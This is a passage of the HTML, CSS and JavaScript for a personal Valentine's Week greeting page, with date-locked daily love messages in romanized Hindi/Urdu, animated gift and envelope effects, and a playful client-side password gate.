            display: flex; flex-direction: column; align-items: center; justify-content: center;
            min-height: 300px; width: 100%;
            font-family: 'Poppins', sans-serif; color: #444;
            text-align: center;
        }
        .vday-line {
            font-size: 1.4rem; font-weight: 300; letter-spacing: 1px;
            opacity: 0; transition: opacity 2s ease;
            margin-bottom: 20px;
        }
        .vday-line.visible { opacity: 1; }
        .vday-final {
            font-family: 'Dancing Script', cursive; font-size: 2rem; color: #d90429;
            margin-top: 10px; opacity: 0; transition: opacity 2s ease;
        }
        .vday-final.visible { opacity: 1; }
        
        /* Final Breathing State */
        .alive-state {
            animation: breathing 6s ease-in-out infinite;
        }

        /* --- SECRET CHOCOLATE FEATURE --- */
        .secret-choco-msg {
            position: absolute; top: 40%; left: 50%;
            transform: translate(-50%, -50%) rotate(180deg);
            font-family: 'Times New Roman', serif; font-size: 1.6rem; font-weight: bold;
            color: rgba(93, 64, 55, 0.12); /* Low contrast, texture-like */
            filter: blur(2px); pointer-events: none;
            transition: all 2s cubic-bezier(0.25, 0.1, 0.25, 1);
            width: 100%; z-index: 5; text-shadow: 1px 1px 0 rgba(255,255,255,0.05);
            user-select: none;
        }
        .secret-choco-msg.revealed {
            transform: translate(-50%, -50%) rotate(0deg);
            color: #5d4037; filter: blur(0);
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.9); z-index: 20;
        }
        .secret-hint-text {
            font-size: 0.6rem; color: #aaa; display: block; margin-top: 4px; opacity: 0.6; font-style: italic;
        }

        @keyframes breathing { 
            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; } 
            50% { transform: translate(-50%, -50%) scale(1.02); opacity: 0.95; } 
        }

        /* --- FOOTER CREDIT --- */
        .footer-credit {
            text-align: center;
            padding: 20px;
            font-family: 'Poppins', sans-serif;
            color: #777;
            font-size: 0.9rem;
            margin-top: 10px;
            letter-spacing: 0.5px;
        }
        .footer-name {
            font-family: 'Pacifico', cursive;
            background: linear-gradient(45deg, #ff0a54, #ff477e);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 1.2rem;
            margin-left: 4px;
            filter: drop-shadow(0 2px 4px rgba(255, 10, 84, 0.2));
        }
        .heart-beat {
            display: inline-block;
            color: #ff0a54;
            animation: heartBeat 1.5s infinite ease-in-out;
            vertical-align: middle;
        }
        @keyframes heartBeat {
            0%, 100% { transform: scale(1); }
            15% { transform: scale(1.2); }
            30% { transform: scale(1); }
            45% { transform: scale(1.2); }
            60% { transform: scale(1); }
        }

        /* --- GIFT BOX SURPRISE --- */
        .gift-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); z-index: 40000;
            display: none; flex-direction: column; justify-content: center; align-items: center;
        }
        .gift-container {
            position: relative; width: 150px; height: 150px; cursor: pointer;
            animation: bounce 2s infinite;
            transition: transform 0.5s;
        }
        .gift-body {
            position: absolute; bottom: 0; width: 100%; height: 85%;
            background: #d90429; border-radius: 0 0 10px 10px;
            box-shadow: inset 0 -10px rgba(0,0,0,0.1);
        }
        .gift-lid {
            position: absolute; top: 0; width: 110%; left: -5%; height: 25%;
            background: #ef233c; border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            transition: transform 0.5s ease-in-out;
            z-index: 2;
        }
        .gift-ribbon-v {
            position: absolute; left: 50%; top: 0; width: 20px; height: 100%;
            background: #fff; transform: translateX(-50%);
        }
        .gift-ribbon-h {
            position: absolute; top: 40%; left: 0; width: 100%; height: 20px;
            background: #fff; transform: translateY(-50%);
        }
        .gift-bow {
            position: absolute; top: -20px; left: 50%; transform: translateX(-50%);
            width: 60px; height: 30px;
        }
        .gift-bow::before, .gift-bow::after {
            content: ''; position: absolute; top: 0; width: 50%; height: 100%;
            border: 4px solid #fff; border-radius: 50% 50% 0 0;
            background: #d90429;
        }
        .gift-bow::before { left: 0; transform: rotate(-10deg); }
        .gift-bow::after { right: 0; transform: rotate(10deg); }

        .gift-container.open .gift-lid { transform: translateY(-60px) rotate(-10deg); }
        .gift-container.open { animation: none; }
        .gift-content {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
            width: 280px; text-align: center; color: white; opacity: 0; pointer-events: none;
            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 1;
        }
        .gift-content.visible { transform: translate(-50%, -60%) scale(1); opacity: 1; pointer-events: auto; z-index: 10; }
        .gift-container.open { transform: translateY(100px) scale(0.8); opacity: 0.5; }
        
        .close-gift-btn {
            margin-top: 15px; padding: 8px 20px; background: #fff; color: #d90429;
            border: none; border-radius: 20px; font-weight: bold; cursor: pointer;
        }
    </style>
</head>
<body>

    <audio id="bgMusic" loop>
        <source src="song.mp3" type="audio/mpeg">
    </audio>
    <div class="bg-hearts" id="heartContainer"></div>
    <canvas id="confetti-canvas"></canvas>
    <div class="music-btn" onclick="toggleMusic()">
        <svg viewBox="0 0 24 24" class="svg-icon"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
    </div>

    <!-- UNIQUE: HEART SCANNER -->
    <div id="scanner-screen">
        <div class="scanner-container" id="scan-btn" ontouchstart="startScan()" ontouchend="stopScan()" onmousedown="startScan()" onmouseup="stopScan()">
            <div class="scan-finger"><svg viewBox="0 0 24 24"><path d="M17.81 4.47c-.08 0-.16-.02-.23-.06C15.66 3.42 14 3 12.01 3c-1.98 0-3.86.47-5.57 1.41-.24.13-.54.04-.68-.2-.13-.24-.04-.55.2-.68C7.82 2.52 9.86 2 12.01 2c2.13 0 3.99.47 6.03 1.52.25.13.34.43.21.67-.09.18-.26.28-.44.28zM3.5 9.72c-.1 0-.2-.03-.29-.09-.23-.16-.28-.47-.12-.7.99-1.4 2.25-2.5 3.75-3.27C9.98 4.04 14 4.03 17.15 5.65c1.5.77 2.76 1.86 3.75 3.25.16.22.11.54-.12.7-.23.16-.54.11-.7-.12-.9-1.26-2.04-2.25-3.39-2.93-2.86-1.48-6.52-1.47-9.38.01-1.36.7-2.5 1.7-3.4 2.96-.08.14-.23.2-.41.2zm6.27 9.81c-.04-.38-.1-.77-.18-1.16-.14-.66-.38-1.3-.71-1.91-.53-.98-1.24-1.84-2.11-2.55-.22-.18-.25-.5-.07-.72.18-.22.5-.25.72-.07 1.03.84 1.88 1.86 2.5 3.03.39.73.67 1.5.84 2.29.06.28-.13.55-.41.61-.05.01-.11.01-.16.01-.24 0-.46-.17-.51-.41l.09-.12zM12 22c-4.97 0-9-4.03-9-9 0-1.76.53-3.4 1.44-4.79.15-.23.46-.29.69-.14.23.15.29.46.14.69C4.49 10.03 4 11.47 4 13c0 4.41 3.59 8 8 8s8-3.59 8-8c0-1.53-.49-2.97-1.27-4.24-.15-.23-.09-.54.14-.69.23-.15.54-.09.69.14.91 1.39 1.44 3.03 1.44 4.79 0 4.97-4.03 9-9 9zm-5-8c0-2.76 2.24-5 5-5s5 2.24 5 5c0 .28-.22.5-.5.5s-.5-.22-.5-.5c0-2.21-1.79-4-4-4s-4 1.79-4 4c0 .28-.22.5-.5.5s-.5-.22-.5-.5z"/></svg></div>
            <div class="scan-line" id="scan-line"></div>
        </div>
        <p class="scan-msg" id="scan-text">Long Press to Verify Identity</p>
        <div class="scan-progress"><div class="scan-bar" id="scan-bar"></div></div>
    </div>

    <!-- NEW: FINGERPRINT VERIFICATION OVERLAY -->
    <div id="fp-overlay" class="fp-overlay noselect">
        <div class="fp-container">
            <svg class="fp-ring-svg" viewBox="0 0 120 120">
                <circle class="fp-ring-bg" cx="60" cy="60" r="54"></circle>
                <circle class="fp-ring-progress" id="fp-progress-ring" cx="60" cy="60" r="54"></circle>
            </svg>
            <div class="fp-icon-btn pulsing" id="fp-btn">
                <svg class="fp-thumb-svg" viewBox="0 0 24 24"><path d="M17.81 4.47c-.08 0-.16-.02-.23-.06C15.66 3.42 14 3 12.01 3c-1.98 0-3.86.47-5.57 1.41-.24.13-.54.04-.68-.2-.13-.24-.04-.55.2-.68C7.82 2.52 9.86 2 12.01 2c2.13 0 3.99.47 6.03 1.52.25.13.34.43.21.67-.09.18-.26.28-.44.28zM3.5 9.72c-.1 0-.2-.03-.29-.09-.23-.16-.28-.47-.12-.7.99-1.4 2.25-2.5 3.75-3.27C9.98 4.04 14 4.03 17.15 5.65c1.5.77 2.76 1.86 3.75 3.25.16.22.11.54-.12.7-.23.16-.54.11-.7-.12-.9-1.26-2.04-2.25-3.39-2.93-2.86-1.48-6.52-1.47-9.38.01-1.36.7-2.5 1.7-3.4 2.96-.08.14-.23.2-.41.2zm6.27 9.81c-.04-.38-.1-.77-.18-1.16-.14-.66-.38-1.3-.71-1.91-.53-.98-1.24-1.84-2.11-2.55-.22-.18-.25-.5-.07-.72.18-.22.5-.25.72-.07 1.03.84 1.88 1.86 2.5 3.03.39.73.67 1.5.84 2.29.06.28-.13.55-.41.61-.05.01-.11.01-.16.01-.24 0-.46-.17-.51-.41l.09-.12zM12 22c-4.97 0-9-4.03-9-9 0-1.76.53-3.4 1.44-4.79.15-.23.46-.29.69-.14.23.15.29.46.14.69C4.49 10.03 4 11.47 4 13c0 4.41 3.59 8 8 8s8-3.59 8-8c0-1.53-.49-2.97-1.27-4.24-.15-.23-.09-.54.14-.69.23-.15.54-.09.69.14.91 1.39 1.44 3.03 1.44 4.79 0 4.97-4.03 9-9 9zm-5-8c0-2.76 2.24-5 5-5s5 2.24 5 5c0 .28-.22.5-.5.5s-.5-.22-.5-.5c0-2.21-1.79-4-4-4s-4 1.79-4 4c0 .28-.22.5-.5.5s-.5-.22-.5-.5c0-2.21-1.79-4-4-4s-4 1.79-4 4c0 .28-.22.5-.5.5s-.5-.22-.5-.5z"/></svg>
                <div class="fp-scan-line" id="fp-scan-line"></div>
            </div>
        </div>
        <p id="fp-status" class="fp-status">Press & Hold to Verify</p>
    </div>

    <!-- NEW: INCOMING CALL SCREEN -->
    <div id="call-screen" class="call-overlay">
        <div class="caller-info">
            <img id="caller-img" src="" class="caller-avatar">
            <h2 id="caller-name">My Valentine ‚ù§Ô∏è</h2>
            <p>Incoming Video Call...</p>
        </div>
        <div class="call-actions">
            <button class="call-btn decline" onclick="declineCall()"><svg viewBox="0 0 24 24" class="svg-icon" style="width:32px;height:32px;"><path d="M12 9c-1.6 0-3.15.25-4.6.72l-1.2-1.2c1.8-.72 3.72-1.12 5.8-1.12 2.08 0 4 .4 5.8 1.12l-1.2 1.2C15.15 9.25 13.6 9 12 9zm0-6c-2.73 0-5.22.55-7.53 1.53l-1.83-1.83C4.6 1.32 8.18.5 12 .5c3.82 0 7.4.82 9.36 2.2l-1.83 1.83C17.22 3.55 14.73 3 12 3zm10.55 8.45l-4.97 4.97c-.39.39-1.02.39-1.41 0l-2.47-2.47c-.39-.39-.39-1.02 0-1.41l1.41-1.41c.39-.39 1.02-.39 1.41 0l1.06 1.06c.78-.35 1.63-.54 2.52-.54.89 0 1.74.19 2.52.54l1.06-1.06c.39-.39 1.02-.39 1.41 0l1.41 1.41c.39.39.39 1.02 0 1.41z" transform="rotate(135 12 12)"/></svg></button>
            <button class="call-btn accept" onclick="acceptCall()"><svg viewBox="0 0 24 24" class="svg-icon" style="width:32px;height:32px;"><path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.44-5.15-3.75-6.59-6.59l1.97-1.57c.26-.27.36-.66.25-1.01-.37-1.11-.56-2.3-.56-3.53 0-.55-.45-1-1-1H4.39c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.5c0-.55-.45-1-1-1z"/></svg></button>
        </div>
    </div>

    <!-- NEW: GIFT BOX OVERLAY -->
    <div id="gift-overlay" class="gift-overlay">
        <div class="gift-container" id="gift-box" onclick="openGiftBox()">
            <div class="gift-lid"><div class="gift-bow"></div><div class="gift-ribbon-v"></div></div>
            <div class="gift-body"><div class="gift-ribbon-v"></div><div class="gift-ribbon-h"></div></div>
        </div>
        <div class="gift-content" id="gift-content">
            <img src="/pk/valentine.png" style="width:100%; border-radius:15px; border:4px solid #fff; margin-bottom:15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);">
            <h2 style="font-family:'Pacifico', cursive; color:#ff4d6d; font-size: 1.8rem; margin-bottom: 5px;">You are my greatest gift! üéÅ</h2>
            <p style="font-family:'Poppins', sans-serif; font-size:1rem; margin-bottom: 15px;">Valentine's week may be over, but my love for you is forever.</p>
            <button class="close-gift-btn" onclick="closeGiftOverlay()">Close</button>
        </div>
        <p id="tap-gift-hint" style="color: #fff; margin-top: 20px; font-family: 'Poppins', sans-serif; opacity: 0.8; animation: pulse 1.5s infinite;">Tap the gift to open!</p>
        <div id="gift-lock-ui" style="display:none; flex-direction:column; align-items:center; margin-top:20px; z-index:20;">
            <input type="password" id="gift-pass" class="pass-input" placeholder="Enter Password..." style="margin-bottom:10px;">
            <button class="enter-btn" onclick="checkGiftPassword()" style="margin-top:0;">Unlock ‚ù§Ô∏è</button>
            <p id="gift-error" style="color:#ff4d6d; font-weight:bold; display:none; margin-top:10px; text-shadow: 0 2px 4px rgba(0,0,0,0.5);">Wrong Password!</p>
        </div>
    </div>

    <div id="custom-popup" class="popup-overlay">
        <div class="popup-box">
            <h3>No Cheating! <svg viewBox="0 0 24 24" class="svg-icon"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/><line x1="3" y1="3" x2="21" y2="21" stroke="currentColor" stroke-width="2"/></svg></h3>
            <p id="popup-message">Ye din abhi nahi aaya hai.</p>
            <button class="popup-btn" onclick="closePopup()">Okay, I'll wait</button>
        </div>
    </div>

    <div id="login-screen">
        <div class="login-box">
            <h2>Love Login <svg viewBox="0 0 24 24" class="svg-icon"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg></h2>
            <p style="margin-bottom: 10px; color: #666;">Enter the secret password</p>
            <input type="password" id="password" class="pass-input" placeholder="Password...">
            <br>
            <button class="enter-btn" onclick="checkPassword()">Unlock My Heart</button>
            <p id="error-msg" style="color: red; font-size: 0.8rem; margin-top: 10px; display: none;">Wrong Password! Try again.</p>
        </div>
    </div>

    <div id="menu-screen">
        <div class="title-container">
            <h1>Valentine Week <svg viewBox="0 0 24 24" class="svg-icon"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg></h1>
            <div id="love-timer">Calculating...</div>
        </div>
        <div class="grid-container" id="grid"></div>
        <div class="footer-credit">
            Designed with <span class="heart-beat">‚ù§Ô∏è</span> by <span class="footer-name">Fahad</span>
        </div>
    </div>

    <div id="letter-screen">
        <button class="back-btn" onclick="goBack()">‚¨Ö Back</button>
        <div class="envelope-wrapper">
            <div class="envelope" id="env" onclick="handleEnvelopeClick()">
                <div class="flap"></div>
            </div>
            <div class="letter-card" id="finalLetter">
                <div class="photo-frame">
                    <img id="day-photo" src="" alt="Memory">
                    <canvas id="scratch-canvas"></canvas>
                </div>
                <div class="content">
                    <div class="day-title" id="day-title">Title</div>
                    <div class="message-text"><span id="typewriter-text"></span><span class="cursor"></span></div>
                    <p style="text-align: right; margin-top: 20px; font-weight: bold; font-size: 1.5rem;">- Yours, Forever</p>
                    <div id="interaction-container" class="interaction-container"></div>
                </div>
            </div>
        </div>
    </div>

    <script>



        // === PASSWORD SETUP ===
        const SECRET_PASS = "hackerstar"; // Password
        const TEST_PASS = "Test"; // Cheat code for testing

        // === SONG SETUP ===
        // Make sure aapke folder me song1.mp3 se song8.mp3 tak files ho
        const daySongs = {
            7: "song1.mp3",  // Rose Day
            8: "song2.mp3",  // Propose Day
            9: "song3.mp3",  // Chocolate Day
            10: "song4.mp3", // Teddy Day
            11: "song5.mp3", // Promisse Day
            12: "song6.mp3", // Hug Day
            13: "song7.mp3", // Kiss Day
            14: "song8.mp3"  // Valentine's Day
        };
        // Default song agar date match na ho
        const defaultSong = "song.mp3";

        // === DATE SETUP (5 Nov 2021) ===
        const startDate = new Date(2021, 10, 5); 

        // Year 2026 ke liye Target Dates
        // SVGs for Icons
        const ICONS = {
            heart: '<svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" fill="currentColor"/></svg>',
            rose: '<svg viewBox="0 0 24 24"><path d="M12 2c-4 0-7 3-7 7 0 2 1 4 3 5-2 1-3 3-3 5 0 3 3 5 7 5s7-2 7-5c0-2-1-4-3-5 2-1 3-3 3-5 0-4-3-7-7-7zm0 2c3 0 5 2 5 5 0 1-1 3-2 3-1 0-2-1-3-1s-2 1-3 1c-1 0-2-2-2-3 0-3 2-5 5-5z" fill="currentColor"/></svg>',
            ring: '<svg viewBox="0 0 24 24"><path d="M12 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm6 7h-2.1c-.5-2.2-2.3-3.9-4.6-4.1V4c0-1.7-1.3-3-3-3s-3 1.3-3 3v.9c-2.3.2-4.1 1.9-4.6 4.1H2v2h1.1c.5 4.3 4.2 7.7 8.6 7.7s8.1-3.4 8.6-7.7H22V9z" fill="currentColor"/></svg>',
            choco: '<svg viewBox="0 0 24 24"><path d="M19 5h-14c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2v-10c0-1.1-.9-2-2-2zm-9 10h-2v-2h2v2zm0-4h-2v-2h2v2zm4 4h-2v-2h2v2zm0-4h-2v-2h2v2zm4 4h-2v-2h2v2zm0-4h-2v-2h2v2z" fill="currentColor"/></svg>',
            teddy: '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-5-9c.83 0 1.5-.67 1.5-1.5S7.83 8 7 8s-1.5.67-1.5 1.5S6.17 11 7 11zm10 0c.83 0 1.5-.67 1.5-1.5S17.83 8 17 8s-1.5.67-1.5 1.5.67 1.5 1.5 1.5zM12 17c2.03 0 3.8-1.11 4.75-2.75-.19-.11-.4-.2-.63-.25-.3-.07-.62-.04-.91.08-.88.37-1.88.37-2.76 0-.29-.12-.61-.15-.91-.08-.23.05-.44.14-.63.25.95 1.64 2.72 2.75 4.75 2.75z" fill="currentColor"/></svg>',
            promise: '<svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3 3.1-3s3.1 1.29 3.1 3v2z" fill="currentColor"/></svg>',
            hug: '<svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 6.5c2.33 0 4.31-1.46 5.11-3.5H6.89c.8 2.04 2.78 3.5 5.11 3.5z" fill="currentColor"/></svg>',
            kiss: '<svg viewBox="0 0 24 24"><path d="M12 13c2 0 3 1 4 1s2-1 3 0c1 1-1 3-3 3-1 0-2-1-3-1s-1 1-2 1-2-1-3-1-4 1-3 3-2 0-3-1-3-3 1-1 2 0 3 0s2-1 4-1zM12 8c2 0 3 1 4 1s2-1 3 0c1 1-1 3-3 3-1 0-2-1-3-1s-1 1-2 1-2-1-3-1-4 1-3 3-2 0-3-1-3-3 1-1 2 0 3 0s2-1 4-1z" fill="currentColor"/></svg>'
        };

        const days = [
            { id: 7, name: "Rose Day", date: "Feb 7", icon: ICONS.rose, color: "#e01e37", title: "My Beautiful Rose",
              image: "/pk/rose.png",
              innerImage: "/pk/rose1.png",
              msg: "Phool to bohot hain, par tumsa pyaara koi nahi. Tum meri zindagi ka wo gulaab ho jo kabhi murjhata nahi." },

            { id: 8, name: "Propose Day", date: "Feb 8", icon: ICONS.ring, color: "#ff4d6d", title: "Will You Be Mine?",
              image: "/pk/propose.png",
              innerImage: "/pk/propose1.png",
              msg: "Mera dil sirf tumhare liye dhadakta hai. Kya tum humesha ke liye meri banogi? I want to grow old with you." },

            { id: 9, name: "Chocolate Day", date: "Feb 9", icon: ICONS.choco, color: "#5d4037", title: "Sweeter Than Candy",
              image: "/pk/chocolate.png",
              innerImage: "/pk/chocolate1.png",
              msg: "Chocolate ki mithaas se bhi zyada mithi hai tumhari awaaz. Life is delicious with you!" },

            { id: 10, name: "Teddy Day", date: "Feb 10", icon: ICONS.teddy, color: "#ff8fab", title: "My Cute Teddy",
              image: "/pk/teddy.png",
              innerImage: "/pk/teddy1.png",
              msg: "Tum meri pyari si teddy ho. Jab bhi miss karun, bas tumhe gale lagane ka mann karta hai." },

            { id: 11, name: "Promise Day", date: "Feb 11", icon: ICONS.promise, color: "#0077b6", title: "A Promise Forever",
              image: "/pk/promise.png",
              innerImage: "/pk/promise1.png",
              msg: "Aaj wada karta hoon, chahe kuch bhi ho, main hamesha tumhara haath pakad kar chalunga. I won't let go." },

            { id: 12, name: "Hug Day", date: "Feb 12", icon: ICONS.hug, color: "#fb8500", title: "Warmest Hugs",
              image: "/pk/hug.png",
              innerImage: "/pk/hug1.png",
              msg: "Tumhare gale lagkar jo sukoon milta hai, wo puri duniya mein kahin nahi. Sending you a tight hug!" },

            { id: 13, name: "Kiss Day", date: "Feb 13", icon: ICONS.kiss, color: "#d90429", title: "Sealed With A Kiss",
              image: "/pk/kiss.png",
              innerImage: "/pk/kiss1.png",
              msg: "Hawaon mein aaj alag hi nasha hai. Sending you a million kisses today to show how much I love you." },

            { id: 14, name: "Valentine's Day", date: "Feb 14", icon: ICONS.heart, color: "#ff0a54", title: "My Forever Valentine",
              image: "/pk/valentine.png",
              innerImage: "/pk/valentine1.png",
              msg: "Tum ho to main hoon. Meri har khushi tumse shuru hoti hai. Happy Valentine's Day Jaan! I Love You." }
        ];



        

        // === PASSWORD FUNCTION ===
        function checkPassword() {
            const input = document.getElementById('password').value.trim();
            
            // Emergency Reset Command
            if (input.toLowerCase() === "reset") {
                localStorage.clear();
                location.reload();
                return;
            }
            
            // Specific Reset for Kiss Day testing
            if (input.toLowerCase() === "resetkiss") {
                localStorage.removeItem('kiss_completed');
                alert("Kiss Day state reset! You can test it again.");
                return;
            }

            if (input.toLowerCase() === SECRET_PASS.toLowerCase()) {
                localStorage.setItem('isLoggedIn', 'true');
                localStorage.removeItem('testMode'); // Ensure normal mode
                unlockApp();
            } else if (input.toLowerCase() === TEST_PASS.toLowerCase()) {
                localStorage.setItem('isLoggedIn', 'true');
                localStorage.setItem('testMode', 'true'); // Enable test mode
                unlockApp();
            } else {
                // Visual Feedback (Shake & Hint)
                const box = document.querySelector('.login-box');
                box.classList.remove('shake-anim'); 
                void box.offsetWidth; // Trigger reflow
                box.classList.add('shake-anim');
                
                const errorMsg = document.getElementById('error-msg');
                errorMsg.style.display = 'block';
                errorMsg.innerText = "Wrong Password! Hint: " + SECRET_PASS;
            }
        }

        // === POPUP FUNCTIONS ===
        function showPopup(msg) {
            document.getElementById('popup-message').innerHTML = msg;
            document.getElementById('custom-popup').style.display = 'flex';
        }

        let giftTimerInterval;
        let isCallDeclined = false;

        function closePopup() {
            if(giftTimerInterval) clearInterval(giftTimerInterval);
            document.getElementById('custom-popup').style.display = 'none';
            if (isCallDeclined) {
                isCallDeclined = false;
                showIncomingCall();
            }
        }

        // === DATE LOCK LOGIC ===
        function isDateLocked(dayId) {
            if (localStorage.getItem('testMode') === 'true') return false; // Unlock all in test mode
            const today = new Date();
            const currentYear = today.getFullYear(); 
            const currentMonth = today.getMonth(); 
            const currentDate = today.getDate();

            // Logic: 2026 se pehle ya Feb mein date se pehle lock rahe
            if (currentYear < 2026) return true;
            if (currentYear === 2026 && currentMonth < 1) return true; // Before Feb
            if (currentYear === 2026 && currentMonth === 1 && currentDate < dayId) return true; // In Feb, before date
            
            return false;
        }

        // === SYSTEM LOGIC ===
        const menuScreen = document.getElementById('menu-screen');
        const letterScreen = document.getElementById('letter-screen');
        const env = document.getElementById('env');
        const card = document.getElementById('finalLetter');
        const audio = document.getElementById('bgMusic');
        let currentData = null;
        let isEnvelopeOpening = false;
        // Global timers for cleanup
        let proposeTimer1, proposeTimer2, proposeTypeInterval;
        let vdayTimer1, vdayTimer2, vdayTimer3, vdayTimer4;
        let kissTimer;
        let isPlaying = false;
        let typeInterval;

        function updateTimer() {
            const now = new Date();
            const diff = now - startDate;
            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
            const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
            const minutes = Math.floor((diff / (1000 * 60)) % 60);
            const seconds = Math.floor((diff / 1000) % 60);
            document.getElementById("love-timer").innerHTML = `Together since 5 Nov 2021: ${days}d ${hours}h ${minutes}m ${seconds}s <svg viewBox="0 0 24 24" class="svg-icon"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>`;
        }
        setInterval(updateTimer, 1000);

        // === SURPRISE TIMER LOGIC ===
        function updateSurpriseTimer() {
            const timerEl = document.getElementById('surprise-timer');
            const countdownEl = document.getElementById('surprise-countdown');
            if (!timerEl || !countdownEl) return;

            const now = new Date();
            const target = new Date(2026, 1, 16, 0, 0, 0); 
            const diff = target - now;
            if (diff <= 0) {
                timerEl.innerHTML = "‚ú® Tap to Open! ‚ú®";
                return;
            }
            const d = Math.floor(diff / (1000 * 60 * 60 * 24));
            const h = Math.floor((diff / (1000 * 60 * 60)) % 24);
            const m = Math.floor((diff / (1000 * 60)) % 60);
            const s = Math.floor((diff / 1000) % 60);
            countdownEl.innerText = `${d}d ${h}h ${m}m ${s}s`;
        }
        setInterval(updateSurpriseTimer, 1000);

        const grid = document.getElementById('grid');
        days.forEach((day, index) => {
            let div = document.createElement('div');
            div.className = 'card';
            let lockIcon = isDateLocked(day.id) ? '<span class="locked-badge"><svg viewBox="0 0 24 24" class="svg-icon"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3 3.1-3s3.1 1.29 3.1 3v2z"/></svg></span>' : '';
            div.innerHTML = `${lockIcon}<img src="${day.image}" class="home-img"><b>${day.name}</b><small>${day.date}</small>`;
            div.onclick = () => loadDay(index);
            grid.appendChild(div);
        });

        // --- CHECK FOR GIFT UNLOCK (After Valentine's Day) ---
        const isVDayDone = localStorage.getItem('verified_day_14') === 'true' || 
                           (new Date().getMonth() === 1 && new Date().getDate() > 14) || 
                           new Date().getMonth() > 1 ||
                           localStorage.getItem('testMode') === 'true';

        if (isVDayDone) {
            let div = document.createElement('div');
            div.className = 'card';
            div.style.gridColumn = "span 2"; 
            div.style.background = "linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%)";
            div.style.border = "2px solid #fff";
            div.style.boxShadow = "0 15px 35px rgba(255, 77, 109, 0.3)";
            div.innerHTML = `
                <div style="display: flex; align-items: center; justify-content: center; gap: 20px;">
                    <div style="font-size:4.5rem; animation: bounce 2s infinite; filter: drop-shadow(0 5px 5px rgba(0,0,0,0.1));">üéÅ</div>
                    <div style="text-align: left;">
                        <div style="font-family: 'Pacifico', cursive; color:#d90429; font-size: 2.2rem; line-height: 1.1; text-shadow: 2px 2px 0 #fff;">Surprise Gift</div>
                        <div id="surprise-timer" style="font-family: 'Poppins', sans-serif; color:#d90429; font-size: 1rem; font-weight: 600; margin-top: 5px; background: rgba(255,255,255,0.6); padding: 2px 10px; border-radius: 10px; display:inline-block;">
                            Unlocks in: <span id="surprise-countdown">Loading...</span>
                        </div>
                    </div>
                </div>`;
            div.onclick = () => checkGiftDate();
            grid.appendChild(div);
        }

        function loadDay(index) {
            isEnvelopeOpening = false;
            currentData = days[index];
            
            // --- POPUP CHECK ---
            if (isDateLocked(currentData.id)) {
